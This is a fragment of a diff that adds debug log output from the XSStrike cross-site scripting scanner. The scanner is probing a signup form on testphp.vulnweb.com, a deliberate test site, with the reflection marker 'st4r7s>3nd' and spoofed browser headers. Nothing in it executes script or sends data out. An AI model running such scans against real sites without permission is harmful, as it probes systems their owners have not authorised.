+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:18,633 core.requester - DEBUG - Requester url: http://testphp.vulnweb.com/search.php?test=query
+2024-01-20 21:54:18,633 core.requester - DEBUG - Requester GET: False
+2024-01-20 21:54:18,633 core.requester - DEBUG - Requester data: {
+  "uuname": "",
+  "upass": "",
+  "upass2": "",
+  "urname": "",
+  "ucc": "",
+  "uemail": "",
+  "uphone": "",
+  "signup": "st4r7s>3nd"
+}
+2024-01-20 21:54:18,633 core.requester - DEBUG - Requester headers: {
+  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991",
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip,deflate",
+  "Connection": "close",
+  "DNT": "1",
+  "Upgrade-Insecure-Requests": "1"
+}
+2024-01-20 21:54:19,424 xsstrike - INFO - Progress: 20/20
+
